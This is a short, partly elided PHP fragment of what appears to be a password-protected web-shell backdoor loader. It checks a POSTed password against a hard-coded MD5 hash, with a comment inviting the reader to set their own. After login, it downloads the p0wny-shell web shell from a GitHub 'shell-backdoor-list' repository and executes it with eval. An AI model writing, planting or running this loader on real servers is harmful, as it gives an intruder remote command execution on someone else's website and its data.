...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '34666664be8e776de31de4fb78f8a15b'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/refs/heads/master/shell/php/p0wny-shell.php');
    eval('?>' . $a);
} else {
